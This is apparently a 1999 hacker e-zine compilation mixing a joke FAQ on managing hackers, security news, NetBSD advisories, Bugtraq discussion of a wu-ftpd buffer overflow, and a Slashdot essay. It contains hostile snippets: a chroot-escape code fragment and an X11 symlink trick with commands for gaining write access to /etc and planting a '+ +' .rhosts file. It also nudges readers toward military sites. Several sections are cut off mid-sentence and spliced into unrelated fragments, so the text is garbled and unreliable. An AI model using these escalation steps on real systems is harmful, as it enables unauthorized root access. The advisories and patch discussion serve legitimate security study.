            special occasions may well be honored, and most hackers will cheerfully wear clothes without holes in them if specifically asked. 
       
            1.2: My hacker won't call me by my title, and doesn't seem to respect me at all.
       
            Your hacker doesn't respect your title. Hackers don't believe that management is "above" engineering; they believe that management is doing one job, and
            engineering is doing another. They may well frequently talk as if management is beneath them, but this is really quite fair; your question implies that you talk as
            if engineering is beneath you. Treat your hacker as an equal, and she will probably treat you as an equal -- quite a compliment! 
       
            1.3: My hacker constantly insults the work of my other workers.
       
            Take your hacker aside, and ask for details of what's wrong with the existing work. It may be that there's something wrong with it. Don't let the fact that it runs
            most of the time fool you; your hacker is probably bothered by the fact that it crashes at all. He may be able to suggest improvements which could
            dramatically improve performance, reliability, or other features. It's worth looking into. 
       
            You may be able to convince your hacker to be more polite, but if there appear to be major differences, it's quite possible that one or more of your existing
            staff are incompetent. Note that hackers, of course, have different standards of competence than many other people. (Read "different" as "much higher".)
       
       Section 2: Productivity.
       
            2.0: My hacker plays video games on company time.
       
            Hackers, writers, and painters all need some amount of time to spend "percolating" -- doing something else to let their subconscious work on a problem. Your
            hacker is probably stuck on something difficult. Don't worry about it. 
       
            2.1: But it's been two weeks since I saw anything!
       
            Your hacker is working, alone probably, on a big project, and just started, right? She's probably trying to figure it all out in advance. Ask her how it's going; if
            she starts a lot of sentences, but interrupts them all with "no, wait..." or "drat, that won't work", it's going well. 
       
            2.2: Isn't this damaging to productivity?
       
            No. Your hacker needs to recreate and think about things in many ways. He will be more productive with this recreation than without it. Your hacker enjoys
            working; don't worry about things getting done reasonably well and quickly. 
       
            2.3: My hacker is constantly doing things unrelated to her job responsibilities.
       
            Do they need to be done? Very few hackers can resist solving a problem when they can solve it, and no one else is solving it. For that matter, is your hacker
            getting her job done? If so, consider these other things a freebie or perk (for you). Although it may not be conventional, it's probably helping out quite a bit. 
       
            2.4: My hacker is writing a book, reading USENET news, playing video games, talking with friends on the phone, and
            building sculptures out of paper clips. On company time!
       
            He sounds happy. The chances are he's in one of three states: 
               1.Basic job responsibilities are periodic (phone support, documentation, et al.) and there's a lull in incoming work. Don't worry about it! 
               2.Your hacker is stuck on a difficult problem. 
               3.Your hacker is bored silly and is trying to find amusement. Perhaps you should find him more challenging work? 
       
            Any of these factors may be involved. All of them may be involved. In general, if the work is challenging, and is getting done, don't worry too much about the
            process. You might ask for your corporation to be given credit in the book.
       
            2.5: But my other workers are offended by my hacker's success, and it hurts their productivity.
       
            Do you really need to have workers around who would rather be the person getting something done, than have it done already? Ego has very little place in the
            workplace. If they can't do it well, assign them to something they can do. 
       
       Section 3: Stimulus and response
       
            3.0: My hacker did something good, and I want to reward him.
       
            Good! Here are some of the things most hackers would like to receive in exchange for their work: 
               1.Respect. 
               2.Admiration. 
               3.Compliments. 
               4.Understanding. 
               5.Discounts on expensive toys. 
               6.Money. 
       
            These are not necessarily in order. The 4th item (understanding) is the most difficult. Try to remember this good thing your hacker just did the next time you
            discover he just spent a day playing x-trek. Rather than complaining about getting work done, write it off as "a perk" that was granted (informally) as a bonus
            for a job well done. Don't worry; hackers get bored quickly when they aren't doing their work.
       
            3.1: My hacker did something bad, and I want to punish him.
       
            Don't. 30 years of psychological research has shown that punishment has no desirable long-term effects. Your hacker is not a lab rat. (Even if he *were* a lab
            rat, punishment wouldn't work; at least, not if he were one of the sorts of lab rats the psych research was done on.) If you don't like something your hacker is
            doing, express your concerns. Explain what it is that bothers you about the behavior. 
       
            Be prepared for an argument; your hacker is a rational entity, and presumably had reasons. Don't jump on him too quickly; they may turn out to be good
            reasons.
       
            Don't be afraid to apologize if you're wrong. If your hacker admits to having been wrong, don't demand an apology; so far as the hacker is concerned,
            admitting to being wrong is an apology, most likely.
       
            3.2: I don't get it. I offered my hacker a significant promotion, and she turned it down and acted offended.
       
            A promotion frequently involves spending more time listening to people describing what they're doing, and less time playing with computers. Your hacker is
            enjoying her work; if you want to offer a reward, consider an improvement in title, a possible raise, and some compliments. Make sure your hacker knows
            you are pleased with her accomplishments -- that's what she's there for. 
       
            3.3: My company policy won't let me give my hacker any more raises until he's in management.
       
            Your company policy is broken. A hacker can earn as much as $150 an hour (sometimes more) doing free-lance consulting. You may wish to offer your
            hacker a contracted permanent consulting position with benefits, or otherwise find loopholes. Or, find perks to offer - many hackers will cheerfully accept a
            discount on hardware from their favorite manufacturer as an effective raise. 
       
            3.4: I can't believe the hacker on my staff is worth as much as we're paying.
       
            Ask the other staff in the department what the hacker does, and what they think of it. The chances are that your hacker is spending a few hours a week
            answering arcane questions that would otherwise require an expensive external consultant. Your hacker may be fulfilling another job's worth of responsibilities
            in his spare time around the office. Very few hackers aren't worth what they're getting paid; they enjoy accomplishing difficult tasks, and improving worker
            efficiency. 
       
       Section 4: What does that mean?
       
            4.0: My hacker doesn't speak English. At least, I don't think so.
       
            Your hacker is a techie. Your best bet is to pick up a copy of TNHD (The New Hacker's Dictionary). It can be found as http://www.ccil.org/jargon (last I
            checked) or from a good bookstore. If you have trouble understanding that reference, ask your hacker if she has a copy, or would be willing to explain her
            terms. Most hackers are willing to explain terms. Be ready for condescension; it's not intended as an insult, but if you don't know the words, she probably has
            to talk down to you at first to explain them. 
       
            It's a reasonably difficult set of words; there are a lot of them, and their usage is much more precise than it sounds. Hackers love word games.
       
            [It is also possible that English is not your hacker's native language, and that it's not yours either. Feel free to substitute a more appropriate language.]
       
            4.1: I can't get an estimate out of my hacker.
       
            Your hacker hasn't figured out how hard the problem is yet. Unlike most workers, hackers will try very hard to refuse to give an estimate until they know for
            sure that they understand the problem. This may include solving it. 
       
            No good engineer goes beyond 95% certainty. Most hackers are good engineers. If you say you will not try to hold him to the estimate (and mean it!) you are
            much more likely to get an approximate estimate. The estimate may sound very high or very low; it may be very high or very low. Still, it's an estimate, and
            you get what you ask for.
       
            4.2: My hacker makes obscure, meaningless jokes.
       
            If you feel brave, ask for an explanation. Most of them can be explained. It may take a while, but it may prove interesting. 
       
            4.3: My hacker counts from zero.
       
            So does the computer. You can hide it, but computers count from zero. Most hackers do by habit, also.

 20.0  Australia gears up security for olympics
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Australia Proposes Intelligence  Service Hacking Powers 

      CANBERRA, AUSTRALIA, 1999 MAR 25
      (Newsbytes) -- By Adam Creed, Newsbytes.
      Australia's internal security service ASIO  (Australian security intelligence organization)
      is set to get increased powers to hack into computers, copy files and alter software on
      computers in Australia as it conducts the country's largest ever intelligence operation
      in the run up to the Sydney 2000 Olympics. 

      Federal Attorney-General Daryl Williams Thursday introduced into the House of
      Representatives the first amendments to the ASIO Act in 20 years. The amendments, if
      passed by Parliament would give the intelligence-gathering service the freedom to
      access information on the computers and networks of Australian companies and
      individuals. 

      Williams claimed the amendments were not n response to the security challenges posed
      by one event, the Olympics, but through a need to have free access to new sources of
      intelligence in the information age. 

      The ASIO Legislation Amendment Bill 1999 will permit security officers to hack into a
      computer if "there are reasonable grounds for believing that access to data held in a
      particular computer (the target computer) will substantially assist the collection of
      intelligence that is important in relation to security. 

      An access warrant permits ASIO to use computers, phone companies and
      telecommunications equipment to to gain access to a remote or networked computer.
      Once in, the ASIO hackers will be allowed to copy, add, delete or alter any data in the
      target computer that is relevant to the security matter. 

      When they leave security officers will be allowed to cover up the fact that they hacked
      into the system and will not be subject to the Crimes Act which forbids computer hacking
      in Australia. 

      Although Williams asserts the expanded powers are not in preparation for the 2000
      Olympics solely, the role of ASIO during the Olympics has been discussed for over a
      year. 

      A 1998 Australian National Audit Office (ANAO) report assessing the adequacy of
      planned responsibilities and preparations for security during the Olympic games speaks
      of the new challenges faced by ASIO as it draws on new sources of information both
      domestically and overseas.  

      "The Olympics represent a task well beyond the normal scope of intelligence activities,
      particularly as it will extend to areas outside the usual focus for Australia's security
      interests," read the report, describing how organizational structures for Olympic
      intelligence operations closely mirrored the arrangements for "coordinating threat
      assessments and activities related to terrorism." 

      During the Olympics ASIO will be expected to collect and disseminate intelligence
      information. Interestingly, at the time of the report, the use of the Internet for
      intelligence-gathering and monitoring in conjunction with intelligence from overseas
      allies (the US and UK) was also discussed. 

      "Access to open source material, e,g, Internet and media, may also be used to
      supplement other material," said the report, talking about online monitoring, search
      engine use and filters. It went on to note problems with this approach caused by the
      huge amount of resources needed and the potential for disinformation.

      1999 can be found on the World Wide Web at http://www.aph.gov.au/parlinfo/billsnet/bills.htm

  21.0 NetBSD security advisories: umapfs and noexec mount flag
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
         
                        NetBSD Security Advisory 1999-006
                        =================================
       
       Topic:          Security hole in umapfs
       Version:        NetBSD 1.3.3 and prior; NetBSD-current until 19990312
       Severity:       Local users can gain root privileges
       
       
       Abstract
       ========
       
       Insufficient kernel checking in the umapfs virtual file system allows 
       local users to remap their user id to any other user including the root 
       user.  
       
       umapfs is enabled in the default (GENERIC) kernel for the following ports:
       amiga, arm32, atari, bebox, i386, mac68k, macppc, newsmips, next68k, 
       next68k, ofppc, pmax, sparc, sparc64, vax, x68k.  
       
       The alpha, hp300, mvme68k, pc532 and sun3 ports do not include umapfs 
       by default.
       
       Technical Details
       =================
       
       umapfs creates a null layer, duplicating a sub-tree of the file system
       name space under another part of the global file system, with uid/gid
       remapping.  The uid and gid mappings are described in two files supplied
       by the user to mount_umap(8).
       
       When a umapfs mount is attempted, no additional checks are done in the
       kernel other than the usual checks: the user must be root, or have read
       access of the target and be owner of the mount point.  The only
       permission checks made were erroneously placed in the mount_umap(8)
       command.  A malicious user can compile their own mount_umap binary that
       does not include these checks.  With this modified mount_umap a user
       can mount any directory on another directory they have write access to
       with their uid mapped to 0.  They will then have be able to create and
       modify root owned files in the source directory, including the ability
       to create setuid root binaries.
       
       
       Solution and Workarounds
       =========================
       
       A patch is available for the NetBSD 1.3.3 which restricts umapfs mounts
       to root and fixes the above problem.  You may find this patch on the
       NetBSD ftp server:
       
           ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/patches/19990311-umapfs
       
       NetBSD-current since 19990312 is not vulnerable.  Users of NetBSD-current
       should upgrade to a source tree later than 19990312.
       
       If neither of the above can be performed, a simple work around is to
       remove umapfs from your kernel configuration and rebuild a kernel.
       For this you need to remove or comment out the line:
       
               file-system     UMAPFS          # NULLFS + uid and gid remapping
       
       in the configuration file.  See these URL's for documentation building
       a NetBSD kernel:

 21.1 NetBSD noexec mount flag advisory
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                   
                   -----BEGIN PGP SIGNED MESSAGE-----
       
                        NetBSD Security Advisory 1999-007
                        =================================
       
       Topic:		noexec mount flag is not properly handled by non-root mount
       Version:	NetBSD 1.3.3 and prior; NetBSD-current until 19990318
       Severity:	Local users can execute binaries they're not allowed to
       
       
       Abstract
       ========
       
       On a system where all partitions writable by regular users are mounted with
       the `noexec' option, a regular user should not be able to execute a binary
       which was not put on the system by the administrator.  Insufficient checks
       in the mount system call may allow a regular user to mount a device,
       remote host or local directory without the `noexec' option, allowing them
       to execute arbitrary binaries.
       
       
       Technical Details
       =================
       
       The mount syscall does not require root privileges, it only requires that
       the user has read access to the target and is owner of the mount point.
       For such mounts, the `nosuid' and `nodev' flags, which disable set-id
       executables and device special files respectively, are automatically handled
       by the mount system call, but not the `noexec' flag, which disables the
       ability to execute binaries on this partition.  This allows a regular
       user to perform a mount on a mount point he owns, and then execute binaries
       from this mount point, even if the mount point was initially in a sub-tree
       of the global filesystem mounted with the `noexec' option.  The easiest way
       to bypass a `noexec' restriction is to use a nullfs mount, but a NFS mount,
       or a mount from a readable block device can allow it as well.
       
       
       Solutions and Workarounds
       =========================
       
       A patch is available for the NetBSD 1.3.3 which makes the mount system call

 22.0  Checkpoint releases new DHCP based user 'mapping' technology to track users
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       Check Point Launches Address Mapping Technology
       
       
       Check Point Software Technologies Ltd. introduced mapping technology
       yesterday that automatically matches an end user's identity to a
       dynamically assigned IP address. 
       
       
       Check Point says its User to Address Mapping technology will help IT
       managers track network use and enforce access policies in Dynamic Host
       Control Protocol, where IP addresses change often. A byproduct of Check
       Point's 1998 merger with MetaInfo, the technology is available as part of
       Check Point's Meta IP software for IP address management. 
       
       
       User to Address Mapping is also integrated with Check Point's Firewall 1
       and VPN 1 products. When IT managers use this technology in conjunction
       with their firewalls, they can control access: assign granular network
       privileges, track excessive Internet usage, and trace unauthorized IP
       addresses that cause conflicts that interrupt network service. 
       
       
       User to Address Mapping transparently maps four components -- a user's
       logon name, logon time, IP address, and Media Access Control address -- to
       a dynamically assigned IP address. An Enterprise Edition of the Meta IP
       4.1 product starts at $9,995 for a 1,000-node network. A version for
       smaller networks starts at $445 for a 100-node license.  -- Amy K. Larsen

       By the way. a site that is good to look around with lots of legit info is www.nic.mil and 
       ftp.nic.mil .... network topology to phone numbers for NIPR/SIPRENET can be found on that
       system.
       
       Anyway the point of all this is that on this navy site its a good idea to {ahem} go FISH
       yeah thats right, http://infosec.nosc.mil/FISH/ has a lot of good information btw fish stands
       for Fleet Internet Security Handbook. Cute huh? heh.

       Here is a ftp vulnerability scanner:
       
       -----[ cut here, ftpscan.c ]-----
       /* 
        * ftpscan 1.o - by vENOMOUS of rdC - Mar 29, 1999
        *
        * This will open a specific file [-f file], get the IPs from it,
        * then, check if FTP port [ -p 21 ] is open and log  the  version.
        * If you specify the [ -o ] flag  it will try log into the FTP
        * and execute LIST command [recursive], this is usefull 
        * for see if there are any world writeable directories.
        *
        * You should know what you can do with that.
        *

       Correct.  This is a full exploit against Redhat 5.2 (the original advisory

       My comment: This posting proves why you need to keep up with the CERT

       exploit followed the discovery of the vulnerability by several weeks.
       While it sometimes happens that exploits are distributed before the daemon
       authors are notified and public security announcement made, this was not

       Yes, the exploit recently posted to Bugtraq takes advantage of the
       realpath() buffer overflows .. as they exist in the Redhat RPM version
       shipped on their 5.<something> CD.  The exploit may require some
       modification to be successfully used against other Linux/Intel systems
       and, of course, will need major changes to be used against other hardware
       or software platforms.
       
       About the exploit posted on Bugtraq: my read-through of the shows it does
       use the vulnerability through the MKD command.  You are correct that some
       Academ beta versions do not use the source-provided vulnerable realpath()
       function for MKD.  ISTM it should be fairly easy to modify the exploit to
       make use of other commands where a given Academ beta version _does_ use
       realpath().  Remember, the exploit is an _example_ of the problem, it does
       not reveal the true magnetude of the vulnerability.  A positive test
       proves vulnerability while a negative test proves nothing.
       
       The vulnerable and non-vulnerable versions were outlined in the advisories
       which _were_ posted on Bugtraq.
       
       The realpath() problem was openly discussed on Bugtraq weeks (months? ..
       I'd have to look through the Bugtraq archives again) before the release of
       the advisories.  The actively maintained versions of the wu-ftpd daemon
       were immedeately corrected as a result of the realpath() vulnerability
       discussions on Bugtraq, so they had been corrected for quite some time
       prior to Netect's research indicating there may be a problem.
       
       At the time of publication of the Netect/CERT Advisories, patches for
       wu-ftpd were unnecessary since the current, maintained, versions were not
       vulnerable.
       
       My patch file for wu-ftpd, which corrects the problem, is presently 644162
       bytes in length, fixes several hundred other problems with the daemon, and
       is available via FTP from ftp://ftp.vr.net/pub/wu-ftpd/ for those silly
       enough to want it (I rather doubt it Aleph would allow it through to the
       Bugtraq the mailing list).  I am not inclined to pull out the patches for
       realpath() because the entire pile of male bovine by-product was replaced.
       
       A patch file for the other major, maintained, version of wu-ftpd
       (BeroFTPD) is not available at all.  Since today it would probably run
       well over 1 Meg, the maintainer sees no point in the fiction of
       'patching'.  He is also dis-inclined to pull out the realpath() changes
       since he and I co-operated on the complete replacement of the function
       (actually he did most of the initial work; I just debugged it).
       
       At about the time of the Netect/CERT Advisorie Redhat released updated
       RPMs for the vulnerable Academ 2.4.2-betas they distribute.  I don't know
       whether they released before or after, but I do recall it was just a few
       hours before their availability was discussed on Bugtraq.
       
       Other versions (from wu-stl and academ) are not actively maintained and
       should not be used in production environments.  Anyone running versions of
       wu-archive / the wu-ftpd daemon older than Academ's 2.4.2-beta-18 has more
       severe problems than this buffer overrun, so I see no point posting the
       patch.  For them the correct solution is either updating to a more current
       version or manual operation of the power switch.
       
       The only current version still vulnerable when the CERT advisory was
       issued the Academ version 2.4.2-beta-18, which is (almost) not actively
       maintained.  A week or two following the CERT advisory Academ silently
       released 2.4.2 (final).
       
       My knowledge of the code, and my direct research indicates:
       
          The 2.4.2 (final) version does not completely solve the problem.  Nor
          does your patch.  (Nor, for that matter, does the Redhat patch but
          that's a moot point since their patch does fix the problem for their
          Linux systems.)
       
          For systems using the realpath() function supplied with the source kit,
          a patch will work to correct, or at least hide, most, if not all, of
          the vulnerability.  For other systems, whether or not the daemon is
          vulernable depends upon whether or not your vendor-supplied realpath()
          function is vulnerable (back to the original discussion on Bugtraq).
       
          The only change here from my recommendations appearing in the Netect
          and CERT advisories is that the number of potentially vulnerable
          systems has been reduced by those using the daemon-supplied realpath()
          function to only those with vendor-supplied vulnerable realpath()
          functions.
       
          To determine if your daemon uses the supplied function, look in
          <wuftpd>/src/config/config.<ostype> for a line reading something like:
       
       #define realpath realpath_on_steroids
       
          If this #define does NOT appear, contact your vendor concerning the
          vulnerability of the realpath() function, or upgrade to a more-current
          version of the daemon (yes, there are versions much more current that
          Academ's 2.4.2/final).
       
       Those wishing further information may contact me via the wu-ftpd support
       mailing list at mailto:wu-ftpd@wugate.wustl.edu .. subscription and
       unsubscription information for that mailing list are in the FAQ.

       From: CyberPsychotic <fygrave@TIGERTEAM.NET>
       To: BUGTRAQ@netspace.org
       Subject: wu-ftpd overflow.
       
       ~ Has some1 located the file/function where
       ~ the overflow takes place ?
       
       
        Yes. I think overflow takes place is function realpath.c:
       look at the end of the function realpath(), which first concatinates
       everything together and then just does strcpy into result variable, which is
       pointer to buffer sized of MAXPATHLEN. You could either owerflow workpath
       variable in realpath, or, if your buffer is not too fat, it will be
       overflowed later, when function makedir returns (called from ftpcmd).
       in either case return address gets overflowed and it returns
       nowhere (or to your exploit code if you put there such, no big deal).
        I've made a couple of fixes to ftpd daemon to generate debugging info via
       syslog, so here's what I have:
       
       Mar 21 12:21:46 gear ftpd[21737]: ftpcmd:1294 (ftpcmd called makedir)
       Mar 21 12:21:46 gear ftpd[21737]: before 3180 (calling realpath line 3128)
       Mar 21 12:21:46 gear ftpd[21737]: overflow:180 (here overflow takes place)
       Mar 21 12:21:46 gear ftpd[21737]: overflow:210 (again. It's being copied twice)
       Mar 21 17:21:47 gear syslogd: Cannot glue message parts together
       Mar 21 12:21:46 gear ftpd[21737]: after 3180 (realpath line 3128 returns)
       /foo/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAA
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       AAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAA
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       Mar 21 17:21:47 gear
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       AAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAA
       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       Mar 21 12:21:47 gear ftpd[21737]: exiting on signal 11
       
       oops..... now it attempted to execute piece at 0x41414141 addy..
       
       
       Some previous beta releases of wu-ftpd are NOT vulneriable
       to this thing because they just don't call realpath function (which does
       overflow) from makedir() function. Here's quick patch I've done to this
       piece (cc'ed to bugtraq since I haven't seen yet any patches fixing this
       problem were posted there):

       Too complex for standart linux
       All we have to do to break chroot is:
       
        mkdir("/sh");   // we already have string "/sh" in memory as a part of
                        // "/bin/sh"
        chroot("/sh");
        chroot("../../../../../../../../../"); // a number of "../" here,
                                               // I used 0x10
       
       Last string can be built is stack with a simple loop

   29.0 Netscape 4.51 allows url sniffing from another window , exploit and patch

       To: BUGTRAQ@netspace.org
       Subject: Netscape Communicator 4.51 allows sniffing of URLs from another window
       
       There is a bug in Netscape Communicator 4.51,4.5/Win95, 4.08/WinNT
       (probably others?), which allows sniffing URLs from another window.
       The exploit uses the ability to execute JavaScript code from specially
       designed URLs in the javascript console window, when an error is deliberately
       invoked.
       
       Demonstration and source is available at:
       http://www.nat.bg/~joro/b11.html
       
       (The exploit does not work if you are behind some versions of a squid proxy.
       If you do not see your URL in a message box, try reloading the main page).
       
       Workaround: Disable JavaScript.

 30.0  X11R6 rewt compromise exploit

       Hey
        If this has already been brought up, you have the right to stone me to
       death, But I havent seen it and ive searched, so here it is:
       
       I was fooling around today, and decided to rm /tmp/.X11-unix and then make
       a symbolic link from a file to /tmp/.X11-unix and then startx. So I backed
       up /etc/passwd and
       ln -s /etc/passwd /tmp/.X11-unix
       and then startx'd as normal user acount, But X wouldnt start, it
       complained and said "is not a directory" So, I made a symbolic link from
       /root to /tmp/.X11-unix, and startx'd as a normal user, and was suprised
       to have write access to /root.
       I was able to write new files to /root but was not able to overright or
       change files, i was able to make a "+ +" .rhosts though.
       I did this to /etc also, changed it from:
       
       drwxr-xr-x
       
       To:
       
       drwxrwxrwt
       
       with:
       
       telnetd ~$ ln -s /etc /tmp/.X11-unix
       telnetd ~$ startx
       
       I have tested this via a remote telnet sesion also, It works if you are
       able to startx and X isnt already running,
       I swung my chair around and got on my gateway, telneted to stinky, logged
       in as a normal user, ln -s /etc /tmp/.X11-unix, startx'd remotly, Saw
       the X startup crap, looked behind me and saw X starting on stinky, I
       turned to my gateway and stoped X, and had write access to /etc.
       
       wh00t@$#!$
       
       The only real thing I can think of for this to be usefull is .rhosts in
       /root...

       Well, when theres a reboot, /tmp/ is cleared. And If you havent started X
       yet, it could be a problem. This isnt and ultra spiffy important problem,
       just thought I would bring it up.

       I tried to reproduce on 2.2.4 linux using

               If the server is older than 6-12 months, or if your card is
       newer
               than the above date, look for a newer version before reporting
               problems.  (see http://www.XFree86.Org/FAQ)
       
       . I'm not able to get write access to /etc, still I'm able to create

       might very well get _worse_ with new 3.3.3 release. Please check.]

       I think you'll want to check the owner of the directory, too.

       Before flying off the handle at Red Hat, you might consider that quite
       possibly they aren't vulnerable to this problem.  As far as I can tell, if
       the system ships with a /tmp/.X11-unix/ directory already in place, and
       none of the system scripts delete it, then there's no security problem
       since nobody can put a rogue symlink at that location in /tmp.
       
       I know Slackware Linux isn't vulnerable to this problem, and never was,
       and I don't think we're the only ones to ship a Linux OS that provides a
       pre-existing /tmp/.X11-unix/.

       No.  Way to strict.  You'll miss people who touched ftpcmd.y and
       recompiled:
         Version wu-2.4.2-academ[BETA-18](2)
       And you'll miss earlier versions which are vulnerable, say:
         Version wu-2.4.2-academ[BETA-12]
       And you'll miss derivatives which are vulnerable, like one of mine:
         Version wu-2.4.2-academ[BETA-18-VR6]

       No.  That's the date and time _you_ compiled the daemon.  The target
       machine was probably compiled some other time.

       Sorry, but this is kind of dumb.  This will check to make sure that you're
       using a specific build of wu-ftpd... but what if you rebuilt it yourself?
       then the timestamp will be different.  The timestamp reflects the
       time/date/zone in which this particular server binary was COMPILED.  So
       basically all this program tells me is if I'm using Redhat's prebuilt
       wu-ftpd binary, right?  My TurboLinux wu-ftpd RPM is correctly patched,
       but it will say that it's 19:19:11 PST 1999 since that's when I built it,
       and I built it in California.

 33.0  The Suburbanization of Slashdot an internet institution by Pasty Drone..
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
              
        The Suburbanization of Slashdot
        by Pasty Drone <a href="mailto:pastydrone@newstrolls.com">email</a><br>
       
       
       So I surfed into Slashdot last week, expecting the usual motley group of posters,
       flamers and idiots that I have come to love watching interact in the great theater
       that is Threads.  But as I looked around, I became aware that gone were the weeds of
       the Meepts!, the empty, unpainted houses of the Firsts!, and the nefarious crackdens
       of the flamers...all around me was a chilling non-organic robot-like civility coming
       from posts that said things like "I like Jon" and "Slashdot is great".  The posts were
       smooth and straight and as boring as a well-kept lawn.  The unpleasant, the idiotic, 
       the taboo had vanished from my screen.  


         Slashdot <a href="http://www.slashdot.org/article.pl?sid=99/03/23/1058204"> had moved 
       to the suburbs. </a> And why should  <a href="http://www.newstrolls.com/news/dev/whois.htm">
       I, the CEO of NewsTrolls</a> care what happens on Slashdot?    It's Rob's site he can do with 
       it what he wants.  And yet...and yet...

       I suppose to understand my feelings about Slashdot I have to explain NewsTrolls' relationship
       with them.  When we started NewsTrolls in September of 1998, we were already well-established
       as daily readers of Slashdot.  Even before our beginning as our own site, I would regularly 
       link to Slashdot articles in the daily trolling I did in HotWired's old Media Rant Threads.
       When NewsTrolls, after collective debate via posts, decided to have advertising on the site, we at 
       <a href="http://www.newstrolls.com/news/dev/troll1123.htm">first only ran with Slashdot's banner 
       </a> as a tribute to their work.  At that time Slashdot was also running our NewsTrolls banner.
       
       Another similarity we share is that when NewsTrolls started out <a href="http://www.newstrolls.com/news/dev/guest/archive.htm">
       Jon Katz contributed articles to us </a>, but after a while he moved over to publish on Slashdot
       I can't really fault him for moving...as a writer whose persona is dependent on the number of 
       Netizens who read and like him, it made business sense to go where the numbers were bigger.  
       And Slashdot is definitely a much larger site than NewsTrolls.
       
       Running a site dedicated to free speech with a Threads board that can be vociferous on a good 
       day and downright cruel on a bad one (myself included) is a giant pain in the ass. I understand
       exactly (albeit on a smaller scale) what Rob's frustrations are.  How do you keep the quality
       up and the spam down? 

       In Slashdot's case, Rob has decided to appoint moderators to rank posts and then let users 
       customize their viewing options so to allow them to choose which posts to view. Sounds reasonable,
       but there are two major problems.
       
       1. The default is set at 0 for new users or users not logged in.  Therefore, no posts that have been
          ranked below 0 are seen.  While the option is there for the readers to change to view all posts, 
          anyone who has been on the Internet more than 5 years knows we are constantly dealing with newbies
          who are lucky to navigate a page, let alone feel secure enough to change options. New users who are
          not computer-savvy stick with defaults.
       2. The moderators who number over 400 were chosen by a smaller group of under 30 who found their posts
          to be useful and informative.  These 400+ now rank the rest of the posts.  The hope is that the 
          moderators will spend more time grading up and only grading down the non-useful posts.  Unfortunately,
          posters who express dissenting opinions  in non-traditional manners are being downgraded, too.
          
          When the moderation article first came out, <a href="http://www.newstrolls.com/news/threads/thread.cgi?436,0,,1">
          I started a thread to discuss the ramifications of moderating threads.</a>
          Regulars of NewsTrolls and readers from /. have been debating the issue with many excellent points. 
          Now here's my half-rant/half-loveletter on Slashdot...
          To me, what I have love about Slashdot is that has epitomized the bizarre bazaar of open source.  
          Scriptkiddies, geeks, phreaks, hackers, crackers, wannabes, sysadmins, developers, suits, all hollering 
          at the story presented, at each other, at the world in general sometimes. Maybe what others call noise, I 
          call music.  I loved to see how a post on KDE could elicit useful links, suggestions, inside scoops, 
          clueless questions, and loud dissenters from the GNOME crowd.  Or how posters would take sides on Perens
          or Raymond with the bloodthirst of gamblers at a cockfight.  Or the hushed awe, meaningful whispers, and
          conspiracy theories that flew whenever Transmeta was mentioned.  Or the joyful solidarity as a new Linux
          kernel was posted.  To me, the organic twists and turns a thread would take was just as enlightening as 
          the articles to which they were attached.  The grammar flames were like a call-and-response between posters
          who had obviously gone through the same motions before.  The glorious meept! nonsense posts was like throwing 
          in moments straight out of Theater of the Absurd.  The First Posts! were crows of delight that said: 
          "I'm here!, You can see me!".  The whole cacophonous din was like walking down Times Square in rush hour 
          when Hansen is in the 2nd Floor MTV studios.  It was ALIVE! It had SOUL!
          Moderation changes all of that.  It cleans up Times Square faster than Disney with a fistful of Giuliani
          tax incentives.  It moves Slashdot to the suburbs.  Now posts are judged worthy or not-worthy.  Instead 
          of simply ignoring idiots, they are now branded with a negative sign.  And worst of all, dissenting 
          opinions, some with good points, are being downgraded as well.  If you experiment with the moderation 
          on 2 or 3, you get all these earnest well-written posts that remind me of church ladies' conversation 
          at a quilting bee.  Ugh!  And if you view the posts by ranked order, the organic flow is cut to bits...
          no longer can you see how one point flows into another and how you got from A to Z.  Is this progress? 
          Is this what web discussion is about?  No matter how much advetisers wish it so, you cannot pin down a
          posting community.  You can't expect them to all know English in the first place and you certainly can't
